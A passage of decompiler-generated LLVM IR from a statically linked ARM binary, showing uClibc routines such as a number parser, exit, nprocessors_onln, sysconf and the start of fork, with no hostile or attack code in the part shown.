  %storemerge47 = phi i32 [ 1, %dec_label_pc_12e80 ], [ 0, %dec_label_pc_12e78 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_12e98 = add i32 %v0_12e98, 1
  store i32 %v1_12e98, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e9c

dec_label_pc_12e9c:                               ; preds = %bb, %dec_label_pc_12e98
  %v0_12ebc = phi i32 [ %v0_12e98, %bb ], [ %v1_12e98, %dec_label_pc_12e98 ]
  %v1_12e9c = and i32 %v0_12e4c, -17
  %v3_12e9c = icmp eq i32 %v1_12e9c, 0
  br i1 %v3_12e9c, label %dec_label_pc_12ea8, label %bb60

bb60:                                             ; preds = %dec_label_pc_12e9c
  br label %bb64

dec_label_pc_12ea8:                               ; preds = %dec_label_pc_12e9c
  %v1_12ea8 = inttoptr i32 %v0_12ebc to i8*
  %v2_12ea8 = load i8, i8* %v1_12ea8, align 1
  %v7_12eac = icmp eq i8 %v2_12ea8, 48
  %v1_12eb0 = add i32 %v0_12e4c, 10
  store i32 %v1_12eb0, i32* %r5.global-to-local, align 4
  br i1 %v7_12eac, label %dec_label_pc_12ebc, label %bb61

bb61:                                             ; preds = %dec_label_pc_12ea8
  br label %.thread8

dec_label_pc_12ebc:                               ; preds = %dec_label_pc_12ea8
  %v1_12ebc = add i32 %v0_12ebc, 1
  %v2_12ebc = inttoptr i32 %v1_12ebc to i8*
  %v3_12ebc = load i8, i8* %v2_12ebc, align 1
  %v4_12ebc = zext i8 %v3_12ebc to i32
  store i32 %v1_12ebc, i32* %r4.global-to-local, align 4
  %v1_12ec0 = or i32 %v4_12ebc, 32
  %v7_12ec4 = icmp eq i32 %v1_12ec0, 120
  %v1_12ec8 = add i32 %v0_12e4c, 8
  store i32 %v1_12ec8, i32* %r5.global-to-local, align 4
  br i1 %v7_12ec4, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_12ebc
  %v3_12ed4 = mul i32 %v1_12ec8, 2
  store i32 %v3_12ed4, i32* %r5.global-to-local, align 4
  %v2_12ed8 = add i32 %v0_12ebc, 2
  store i32 %v2_12ed8, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12ebc, %bb61, %bb62
  %v1_12fac30 = phi i32 [ %v0_12e50, %bb61 ], [ %v1_12ebc, %bb62 ], [ %v1_12ebc, %dec_label_pc_12ebc ]
  %v0_12f2821 = phi i32 [ %v0_12ebc, %bb61 ], [ %v2_12ed8, %bb62 ], [ %v1_12ebc, %dec_label_pc_12ebc ]
  %v0_12edc = phi i32 [ %v1_12eb0, %bb61 ], [ %v3_12ed4, %bb62 ], [ %v1_12ec8, %dec_label_pc_12ebc ]
  %v5_12ee0 = icmp slt i32 %v0_12edc, 16
  br i1 %v5_12ee0, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_12fac29 = phi i32 [ %v0_12e50, %bb60 ], [ %v1_12fac30, %.thread8 ], [ %v1_12fac30, %bb63 ]
  %v0_12f2820 = phi i32 [ %v0_12ebc, %bb60 ], [ %v0_12f2821, %.thread8 ], [ %v0_12f2821, %bb63 ]
  %v0_12f08 = phi i32 [ %v0_12e4c, %bb60 ], [ %v0_12edc, %.thread8 ], [ 16, %bb63 ]
  %v1_12ee4 = add i32 %v0_12f08, -2
  %tmp = icmp ugt i32 %v1_12ee4, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_12ef4

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12fa8

dec_label_pc_12ef4:                               ; preds = %bb64
  %v2_12efc = udiv i32 -1, %v0_12f08
  %v3_12efc = urem i32 -1, %v0_12f08
  store i32 %v0_12f08, i32* %r1.global-to-local, align 4
  %v1_12f0c = urem i32 %v3_12efc, 256
  store i32 %v1_12f0c, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_12efc, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12f28

dec_label_pc_12f24:                               ; preds = %bb71, %dec_label_pc_12f84
  %v0_12f24 = phi i32 [ %v1_12f6444, %bb71 ], [ %v0_12f24.pre, %dec_label_pc_12f84 ]
  br label %dec_label_pc_12f28

dec_label_pc_12f28:                               ; preds = %dec_label_pc_12ef4, %dec_label_pc_12f24
  %v1_12fac27 = phi i32 [ %v1_12fac29, %dec_label_pc_12ef4 ], [ %v0_12f24, %dec_label_pc_12f24 ]
  %v0_12f64 = phi i32 [ %v0_12f2820, %dec_label_pc_12ef4 ], [ %v0_12f24, %dec_label_pc_12f24 ]
  %v1_12f28 = inttoptr i32 %v0_12f64 to i8*
  %v2_12f28 = load i8, i8* %v1_12f28, align 1
  %v3_12f28 = zext i8 %v2_12f28 to i32
  %v1_12f2c = add nsw i32 %v3_12f28, -48
  %v1_12f30 = urem i32 %v1_12f2c, 256
  store i32 %v1_12f30, i32* %r1.global-to-local, align 4
  %v1_12f38 = or i32 %v3_12f28, 32
  %tmp79 = icmp ult i32 %v1_12f30, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_12f40

dec_label_pc_12f40:                               ; preds = %dec_label_pc_12f28
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_12f38, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_12f40
  %v1_12f44 = add nsw i32 %v1_12f38, -87
  %v5_12f4c = urem i32 %v1_12f44, 256
  store i32 %v5_12f4c, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_12f28, %dec_label_pc_12f40, %bb65
  %v3_12f7c = phi i32 [ %v1_12f30, %dec_label_pc_12f28 ], [ 40, %dec_label_pc_12f40 ], [ %v5_12f4c, %bb65 ]
  %v1_12f50 = load i32, i32* %r5.global-to-local, align 4
  %v6_12f54 = icmp slt i32 %v3_12f7c, %v1_12f50
  br i1 %v6_12f54, label %dec_label_pc_12f58, label %dec_label_pc_12fa8.loopexit

dec_label_pc_12f58:                               ; preds = %bb66
  %v0_12f58 = load i32, i32* %ip.global-to-local, align 4
  %v1_12f58 = load i32, i32* %r8.global-to-local, align 4
  %v9_12f58 = icmp eq i32 %v0_12f58, %v1_12f58
  br i1 %v9_12f58, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_12f58
  %v1_12f6440 = add i32 %v0_12f64, 1
  store i32 %v1_12f6440, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12f6c

bb67:                                             ; preds = %dec_label_pc_12f58
  %v3_12f58 = icmp ult i32 %v0_12f58, %v1_12f58
  %v1_12f64 = add i32 %v0_12f64, 1
  store i32 %v1_12f64, i32* %r4.global-to-local, align 4
  br i1 %v3_12f58, label %dec_label_pc_12f6c, label %dec_label_pc_12f84

dec_label_pc_12f6c:                               ; preds = %bb67, %.thread39
  %v1_12f6444 = phi i32 [ %v1_12f6440, %.thread39 ], [ %v1_12f64, %bb67 ]
  %v4_12f742443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_12f6c = load i32, i32* %sl.global-to-local, align 4
  %v3_12f6c = icmp uge i32 %v3_12f7c, %v1_12f6c
  %v9_12f6c = icmp eq i32 %v3_12f7c, %v1_12f6c
  %v2_12f70 = xor i1 %v3_12f6c, true
  %v3_12f70 = or i1 %v9_12f6c, %v2_12f70
  br i1 %v3_12f70, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_12f6c
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_12f6c, %bb68
  %v4_12f74 = phi i32 [ %v4_12f742443, %dec_label_pc_12f6c ], [ 0, %bb68 ]
  %v2_12f74 = xor i1 %v9_12f6c, true
  %v3_12f74 = and i1 %v3_12f6c, %v2_12f74
  br i1 %v3_12f74, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_12f74 = urem i32 %v4_12f74, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_12f78 = phi i32 [ %v5_12f74, %bb70 ], [ %v4_12f74, %bb69 ]
  %v2_12f78 = icmp eq i32 %v0_12f78, 0
  br i1 %v2_12f78, label %bb71, label %dec_label_pc_12f84

bb71:                                             ; preds = %thread-pre-split
  %v4_12f7c = mul i32 %v0_12f58, %v1_12f50
  %v5_12f7c = add i32 %v4_12f7c, %v3_12f7c
  store i32 %v5_12f7c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12f24

dec_label_pc_12f84:                               ; preds = %bb67, %thread-pre-split
  %v0_12f8c = call i32 @__aeabi_read_tp()
  %v0_12f90 = load i32, i32* %r7.global-to-local, align 4
  %v2_12f90 = and i32 %v0_12e54, %v0_12f90
  store i32 %v2_12f90, i32* %r7.global-to-local, align 4
  %v0_12f94 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_12f94, i32* %ip.global-to-local, align 4
  %v3_12f98 = load i16, i16* @global_var_216f0.341, align 2
  %v4_12f98 = sext i16 %v3_12f98 to i32
  %v3_12fa0 = add i32 %v4_12f98, %v0_12f8c
  %v4_12fa0 = inttoptr i32 %v3_12fa0 to i32*
  store i32 34, i32* %v4_12fa0, align 4
  %v0_12f24.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12f24

dec_label_pc_12fa8.loopexit:                      ; preds = %bb66
  %v0_12fa8.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_12fa8

dec_label_pc_12fa8:                               ; preds = %.thread, %dec_label_pc_12fa8.loopexit
  %v1_12fac = phi i32 [ %v1_12fac27, %dec_label_pc_12fa8.loopexit ], [ %v1_12fac29, %.thread ]
  %v2_12fac = phi i32 [ %v0_12fa8.pre, %dec_label_pc_12fa8.loopexit ], [ %v0_12e48, %.thread ]
  %v2_12fa8 = icmp eq i32 %v2_12fac, 0
  br i1 %v2_12fa8, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_12fa8
  %v3_12fac = inttoptr i32 %v2_12fac to i32*
  store i32 %v1_12fac, i32* %v3_12fac, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_12fa8, %bb72
  %v0_12fb4 = load i32, i32* %r7.global-to-local, align 4
  %v2_12fb4 = icmp eq i32 %v0_12fb4, 0
  %. = select i1 %v2_12fb4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_12fc0 = icmp eq i32 %v0_12e54, 0
  %v0_12fec.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_12fc0, label %dec_label_pc_12fe4, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_12fec.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_12fcc, label %dec_label_pc_12fe4

dec_label_pc_12fcc:                               ; preds = %bb76
  %v0_12fd0 = call i32 @__aeabi_read_tp()
  %v3_12fd4 = load i16, i16* @global_var_216f0.341, align 2
  %v4_12fd4 = sext i16 %v3_12fd4 to i32
  %v3_12fdc = add i32 %v4_12fd4, %v0_12fd0
  %v4_12fdc = inttoptr i32 %v3_12fdc to i32*
  store i32 34, i32* %v4_12fdc, align 4
  %v0_12fe0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12fe0, i32* %ip.global-to-local, align 4
  %v0_12fe4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12fe4

dec_label_pc_12fe4:                               ; preds = %bb76, %bb73, %dec_label_pc_12fcc
  %v0_12fec.pre = phi i32 [ %v0_12fec.pre.pre, %bb76 ], [ %v0_12fe0, %dec_label_pc_12fcc ], [ %v0_12fec.pre.pre, %bb73 ]
  %v0_12fe4 = phi i32 [ %v0_12fb4, %bb76 ], [ %v0_12fe4.pre, %dec_label_pc_12fcc ], [ %v0_12fb4, %bb73 ]
  %v2_12fe4 = icmp eq i32 %v0_12fe4, 0
  br i1 %v2_12fe4, label %dec_label_pc_12fe4._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_12fe4
  %v2_12fe8 = sub i32 0, %v0_12fec.pre
  store i32 %v2_12fe8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12fe4._crit_edge

dec_label_pc_12fe4._crit_edge:                    ; preds = %dec_label_pc_12fe4, %bb77
  %v0_12fec = phi i32 [ %v2_12fe8, %bb77 ], [ %v0_12fec.pre, %dec_label_pc_12fe4 ]
  ret i32 %v0_12fec

; uselistorder directives
  uselistorder i32 %v0_12fec.pre, { 1, 0 }
  uselistorder i32 %v0_12fec.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_12f74, { 1, 0 }
  uselistorder i1 %v3_12f6c, { 1, 0 }
  uselistorder i32 %v1_12f6c, { 1, 0 }
  uselistorder i32 %v5_12f4c, { 1, 0 }
  uselistorder i32 %v1_12f38, { 1, 0 }
  uselistorder i32 %v1_12f30, { 2, 0, 1 }
  uselistorder i32 %v0_12f64, { 1, 0, 2 }
  uselistorder i32 %v0_12f24, { 1, 0 }
  uselistorder i32 %v3_12ed4, { 1, 0 }
  uselistorder i32 %v1_12ec8, { 1, 0, 2 }
  uselistorder i32 %v0_12ebc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_12e98, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12e54, { 1, 0 }
  uselistorder i32 %v0_12e50, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12e4c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 1, 2, 0, 4, 5, 3, 6 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12fe4._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12fe4, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_12fa8, { 1, 0 }
  uselistorder label %dec_label_pc_12f84, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12f28, { 1, 0 }
  uselistorder label %dec_label_pc_12f24, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12e9c, { 1, 0 }
  uselistorder label %dec_label_pc_12e98, { 1, 0 }
  uselistorder label %dec_label_pc_12e60, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r5, align 4
  %v4_13018 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 140) to i32*), align 4
  store i32 %v4_13018, i32* @r4, align 4
  %v2_13020 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_13038 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13038)
  %v0_1304c = load i32, i32* @r5, align 4
  %v2_1304c = add i32 %v0_1304c, 16
  %v3_1304c = inttoptr i32 %v2_1304c to i32*
  %v4_1304c = load i32, i32* %v3_1304c, align 4
  call void @__pseudo_branch(i32 %v4_1304c)
  %v0_1305c = load i32, i32* @r5, align 4
  %v2_1305c = add i32 %v0_1305c, 636
  %v3_1305c = inttoptr i32 %v2_1305c to i32*
  %v4_1305c = load i32, i32* %v3_1305c, align 4
  %v2_13064 = icmp eq i32 %v4_1305c, 0
  br i1 %v2_13064, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_13070 = xor i1 %v2_13064, true
  call void @__pseudo_cond_branch(i1 %v2_13070, i32 %v4_1305c)
  store i32 %v2_13020, i32* @r0, align 4
  %v0_13080 = load i32, i32* @r5, align 4
  %v2_13080 = add i32 %v0_13080, 44
  %v3_13080 = inttoptr i32 %v2_13080 to i32*
  %v4_13080 = load i32, i32* %v3_13080, align 4
  call void @__pseudo_branch(i32 %v4_13080)
  %v0_1308c = call i32 @__GI___uClibc_fini()
  %v0_13094 = load i32, i32* @r5, align 4
  %v2_13094 = add i32 %v0_13094, -47748
  %v2_1309c = icmp eq i32 %v2_13094, 0
  br i1 %v2_1309c, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_130a4 = xor i1 %v2_1309c, true
  call void @__pseudo_cond_branch(i1 %v2_130a4, i32 %v2_13094)
  %v0_130a8 = load i32, i32* @r6, align 4
  %v1_130ac = call i32 @__GI__exit(i32 %v0_130a8)
  %v0_130b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_130b0, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v3_130b0 = load i32, i32* @r6, align 4
  %v4_130b0 = lshr i32 %v4_13080, %v3_130b0
  %v5_130b0 = sub i32 32, %v3_130b0
  %v6_130b0 = shl i32 %v4_13080, %v5_130b0
  %v7_130b0 = or i32 %v6_130b0, %v4_130b0
  %v9_130b0 = and i32 %v7_130b0, %v1_130ac
  store i32 %v9_130b0, i32* @lr, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_130c8 = phi i32 [ %v1_130ac, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_130c8

; uselistorder directives
  uselistorder i32 %v1_130ac, { 1, 0 }
  uselistorder i32 %v4_13080, { 1, 0, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 -34012), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_130f0 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 -34012))
  store i32 %v1_130f0, i32* @r6, align 4
  %v2_130f4 = icmp eq i32 %v1_130f0, 0
  br i1 %v2_130f4, label %dec_label_pc_13174, label %dec_label_pc_130fc

dec_label_pc_130fc:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_13104 = load i32, i32* @r4, align 4
  %v2_13104 = add i32 %v0_13104, -34000
  store i32 %v2_13104, i32* @r8, align 4
  %v2_13108 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13108, i32* @r7, align 4
  br label %bb18

dec_label_pc_13110:                               ; preds = %bb18
  %v3_13110 = load i32, i32* %stack_var_-36, align 4
  %v1_13114 = inttoptr i32 %v3_13110 to i32*
  %v2_13114 = load i32, i32* %v1_13114, align 4
  %v1_13118 = inttoptr i32 %v2_13114 to i8*
  %v2_13118 = load i8, i8* %v1_13118, align 1
  %v7_1311c = icmp eq i8 %v2_13118, 99
  br i1 %v7_1311c, label %dec_label_pc_13124, label %.backedge3

dec_label_pc_13124:                               ; preds = %dec_label_pc_13110
  %v1_13124 = add i32 %v2_13114, 1
  %v2_13124 = inttoptr i32 %v1_13124 to i8*
  %v3_13124 = load i8, i8* %v2_13124, align 1
  %v7_13128 = icmp eq i8 %v3_13124, 112
  br i1 %v7_13128, label %dec_label_pc_13130, label %.backedge3

dec_label_pc_13130:                               ; preds = %dec_label_pc_13124
  %v1_13130 = add i32 %v2_13114, 2
  %v2_13130 = inttoptr i32 %v1_13130 to i8*
  %v3_13130 = load i8, i8* %v2_13130, align 1
  %v7_13134 = icmp eq i8 %v3_13130, 117
  br i1 %v7_13134, label %dec_label_pc_1313c, label %.backedge3

dec_label_pc_1313c:                               ; preds = %dec_label_pc_13130
  %v1_1313c = add i32 %v2_13114, 3
  %v2_1313c = inttoptr i32 %v1_1313c to i8*
  %v3_1313c = load i8, i8* %v2_1313c, align 1
  %v4_1313c = zext i8 %v3_1313c to i32
  %v0_13140 = load i32, i32* @r4, align 4
  %v1_13140 = load i32, i32* @sl, align 4
  %v2_13140 = add i32 %v1_13140, %v0_13140
  %v3_13140 = inttoptr i32 %v2_13140 to i32*
  %v4_13140 = load i32, i32* %v3_13140, align 4
  %v2_13144 = mul nuw nsw i32 %v4_1313c, 2
  %v2_13148 = add i32 %v4_13140, %v2_13144
  %v3_13148 = inttoptr i32 %v2_13148 to i16*
  %v4_13148 = load i16, i16* %v3_13148, align 2
  %v1_1314c = and i16 %v4_13148, 8
  %v2_1314c = icmp eq i16 %v1_1314c, 0
  br i1 %v2_1314c, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_1313c
  %v1_13150 = load i32, i32* @r5, align 4
  %v2_13150 = add i32 %v1_13150, 1
  store i32 %v2_13150, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_1313c, %dec_label_pc_13110, %dec_label_pc_13124, %dec_label_pc_13130
  %v0_13154.pre = load i32, i32* @r6, align 4
  %v0_13160.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_130fc
  %v0_13160 = phi i32 [ %v0_13160.pre, %.backedge3 ], [ %v2_13104, %dec_label_pc_130fc ]
  %v0_13154 = phi i32 [ %v0_13154.pre, %.backedge3 ], [ %v1_130f0, %dec_label_pc_130fc ]
  %v4_13164 = inttoptr i32 %v0_13154 to i32*
  %v5_13164 = call i32 @__GI_config_read(i32* %v4_13164, i32 %v2_13108, i32 258, i32 %v0_13160)
  %v2_13168 = icmp eq i32 %v5_13164, 0
  br i1 %v2_13168, label %dec_label_pc_131d8, label %dec_label_pc_13110

dec_label_pc_13174:                               ; preds = %entry
  %v0_13178 = load i32, i32* @r4, align 4
  %v2_13178 = add i32 %v0_13178, -33996
  store i32 %v2_13178, i32* @r0, align 4
  %v1_1317c = call i32 @__GI_config_open(i32 %v2_13178)
  store i32 %v1_1317c, i32* @r6, align 4
  %v2_13180 = icmp eq i32 %v1_1317c, 0
  br i1 %v2_13180, label %bb19, label %dec_label_pc_1318c

bb19:                                             ; preds = %dec_label_pc_13174
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_131d8

dec_label_pc_1318c:                               ; preds = %dec_label_pc_13174
  %v0_13190 = load i32, i32* @r4, align 4
  %v2_13190 = add i32 %v0_13190, -33980
  store i32 %v2_13190, i32* @r8, align 4
  %v2_13198 = add i32 %v0_13190, -33944
  store i32 %v2_13198, i32* @r7, align 4
  %v2_1319c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1319c, i32* @r4, align 4
  br label %bb21

dec_label_pc_131a4:                               ; preds = %bb21
  %v0_131d0 = load i32, i32* @r8, align 4
  %v3_131a4 = load i32, i32* %stack_var_-36, align 4
  %v1_131a8 = inttoptr i32 %v3_131a4 to i32*
  %v2_131a8 = load i32, i32* %v1_131a8, align 4
  store i32 %v2_131a8, i32* @r1, align 4
  %v2_131ac = inttoptr i32 %v0_131d0 to i8*
  %v3_131ac = call i32 @__GI_strcoll(i8* %v2_131ac, i32 %v2_131a8)
  %v2_131b0 = icmp eq i32 %v3_131ac, 0
  br i1 %v2_131b0, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_131a4
  %v1_131b4 = load i32, i32* @r5, align 4
  %v2_131b4 = add i32 %v1_131b4, 1
  store i32 %v2_131b4, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_131a4
  %v0_131c0.pre = load i32, i32* @r7, align 4
  %v0_131c4.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_1318c
  %v0_131c4 = phi i32 [ %v0_131c4.pre, %.backedge ], [ %v1_1317c, %dec_label_pc_1318c ]
  %v0_131c0 = phi i32 [ %v0_131c0.pre, %.backedge ], [ %v2_13198, %dec_label_pc_1318c ]
  %v4_131c8 = inttoptr i32 %v0_131c4 to i32*
  %v5_131c8 = call i32 @__GI_config_read(i32* %v4_131c8, i32 %v2_1319c, i32 459266, i32 %v0_131c0)
  %v2_131cc = icmp eq i32 %v5_131c8, 0
  br i1 %v2_131cc, label %dec_label_pc_131d8, label %dec_label_pc_131a4

dec_label_pc_131d8:                               ; preds = %bb18, %bb21, %bb19
  %v0_131d8 = load i32, i32* @r6, align 4
  %v1_131dc = inttoptr i32 %v0_131d8 to i32*
  %v2_131dc = call i32 @__GI_config_close(i32* %v1_131dc)
  %v0_131e0 = load i32, i32* @r5, align 4
  %v2_131e0 = icmp eq i32 %v0_131e0, 0
  %.v0_131e0 = select i1 %v2_131e0, i32 1, i32 %v0_131e0
  ret i32 %.v0_131e0

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_131d8, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_1360c

bb:                                               ; preds = %entry
  %v7_13230 = mul i32 %arg1, 4
  %v8_13230 = add i32 %v7_13230, ptrtoint (i32* @global_var_13238.491 to i32)
  call void @__pseudo_branch(i32 %v8_13230)
  br label %dec_label_pc_1360c

dec_label_pc_1360c:                               ; preds = %bb, %entry
  %v0_13610 = call i32 @__aeabi_read_tp()
  %v3_13614 = load i16, i16* @global_var_216f0.341, align 2
  %v4_13614 = sext i16 %v3_13614 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13620 = add i32 %v4_13614, %v0_13610
  %v4_13620 = inttoptr i32 %v3_13620 to i32*
  store i32 22, i32* %v4_13620, align 4
  %v0_13804 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_13804

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_13840 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_13840, i32* @ip, align 4
  store i32 12772, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r8.global-to-local, align 4
  %v4_1393016 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 12772) to i32*), align 4
  store i32 %v4_1393016, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1393418 = icmp eq i32 %v4_1393016, 0
  br i1 %v2_1393418, label %dec_label_pc_1393c, label %dec_label_pc_13860

dec_label_pc_13860:                               ; preds = %entry, %dec_label_pc_13930.backedge
  store i32 -61441, i32* @ip, align 4
  call void @__pseudo_branch(i32 -61536)
  %v0_1386c = load i32, i32* %r7.global-to-local, align 4
  %v1_1386c = add i32 %v0_1386c, 20
  %v2_1386c = inttoptr i32 %v1_1386c to i32*
  %v3_1386c = load i32, i32* %v2_1386c, align 4
  store i32 %v3_1386c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13870 = icmp eq i32 %v3_1386c, 0
  store i32 %v3_1386c, i32* %r4.global-to-local, align 4
  br i1 %v2_13870, label %dec_label_pc_13930.backedge, label %dec_label_pc_13880

dec_label_pc_13930.backedge:                      ; preds = %dec_label_pc_13860, %dec_label_pc_138ac
  %v0_13930 = load i32, i32* %r8.global-to-local, align 4
  %v1_13930 = load i32, i32* %r5.global-to-local, align 4
  %v2_13930 = add i32 %v1_13930, %v0_13930
  %v3_13930 = inttoptr i32 %v2_13930 to i32*
  %v4_13930 = load i32, i32* %v3_13930, align 4
  store i32 %v4_13930, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13934 = icmp eq i32 %v4_13930, 0
  br i1 %v2_13934, label %dec_label_pc_1393c, label %dec_label_pc_13860

dec_label_pc_13880:                               ; preds = %dec_label_pc_13860
  %v0_13880 = load i32, i32* %r8.global-to-local, align 4
  %v1_13880 = load i32, i32* %r5.global-to-local, align 4
  %v2_13880 = add i32 %v1_13880, %v0_13880
  %v3_13880 = inttoptr i32 %v2_13880 to i32*
  %v4_13880 = load i32, i32* %v3_13880, align 4
